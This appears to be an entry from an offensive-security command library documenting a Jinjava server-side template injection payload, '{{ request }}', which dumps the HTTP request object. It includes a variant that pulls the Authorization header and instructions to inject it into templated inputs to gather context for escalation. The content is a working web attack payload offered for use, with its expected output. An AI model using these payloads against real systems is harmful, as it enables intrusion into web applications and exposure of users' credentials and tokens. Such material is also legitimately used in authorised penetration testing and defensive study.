---
id: 8e1f6529-0bb0-4921-8cec-206d8add23fb
name: jinjava-access-request-object
type: command
executor: jinjava-template
data: '{{ request }}'
output: null
created_at: '2023-04-06T03:56:39.935803+00:00'
updated_at: '2023-04-10T20:23:50.082714+00:00'
platforms:
  - Web
tags:
  - ssti
  - jinjava
verified: true
validated: true
---

# jinjava-access-request-object

## Command

```
{{ request }}
```

## Description

This Jinjava template payload accesses the current HTTP request object, dumping its string representation to confirm SSTI and expose request details. Inject into templated inputs to gather server context for escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `request` | Built-in Jinjava keyword for the HTTP request context | Built-in |

## Examples

### Basic Usage

```
{{ request }}
```

Renders the request object hash.

### Advanced Usage

```
{{ request.getHeader('Authorization') }}
```

To extract specific headers if method is accessible.

## Expected Output

Renders a string like "com.hubspot.jinjava.context.TemplateContextRequest@23548206", indicating successful object access. Full dumps may include headers or attributes.

## Related

- [[procedures/Jinjava-SSTI-Uppercase-String-and-Request-Object-Injection]]
- [[commands/jinjava-inject-uppercase-string]]
